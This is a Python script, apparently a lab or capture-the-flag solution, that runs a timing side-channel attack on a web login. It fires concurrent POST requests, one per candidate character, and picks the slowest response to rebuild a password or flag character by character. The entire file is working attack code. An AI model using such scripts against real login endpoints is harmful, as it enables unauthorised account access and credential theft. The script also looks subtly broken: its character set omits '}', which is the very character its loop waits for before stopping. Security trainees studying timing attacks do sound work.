#!/usr/bin/python3
from requests_futures.sessions import FuturesSession
from concurrent.futures import as_completed
import string

char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_'

url = "http://ptl-cdb54a60-490f481f.libcurl.so/"

flag = ''

print("[*]Getting the password.......")

with FuturesSession(max_workers=len(char_set)) as session:
    stat = {}
    while not flag.endswith("}"):
        threads = [
                    session.post(url, data={"password": f"{flag + char}"}) 
                    for char in char_set
                ]

        flag += max(zip((thread.result().elapsed.total_seconds() for thread in threads), char_set))[1]
        print(f"[*]Password: {flag}")

print(f"[!]Password: {flag}")